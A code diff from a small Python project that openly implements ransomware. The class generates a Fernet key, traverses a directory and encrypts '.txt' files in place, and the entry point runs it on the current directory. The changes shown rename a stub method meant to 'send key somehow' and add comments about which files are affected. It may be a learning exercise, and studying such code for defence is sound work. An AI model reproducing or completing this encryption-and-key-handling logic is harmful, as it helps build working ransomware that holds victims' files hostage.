@@ -17,9 +17,9 @@ class ransomware(object):
             self.keyfile = None
             self.key = Fernet.generate_key()
             self.cryptor = Fernet(self.key)
-            self.send_key()
+            self.create_key()
 
-    def send_key(self):
+    def create_key(self):
         """
         send key somehow!
         """
@@ -39,7 +39,7 @@ class ransomware(object):
 
     def fileextcheck(self,path):
         for file in self.path_traversal(path):
-            if not file.endswith("txt"):
+            if not file.endswith("txt"):#encrypt only .txt
                 continue
             with open(file,"rb+") as f:
                 data = f.read()
@@ -68,5 +68,5 @@ def test():
         f.write(rware.decrypt(data))
 if __name__ == "__main__":
     # don't confused attr of object with parameters
-    rware = ransomware(keyfile="keyfile")
-    rware.fileextcheck('.')
+    rware = ransomware(keyfile="keyfile") #takes keyfile param out to encrypt
+    rware.fileextcheck('.')#affect current dir
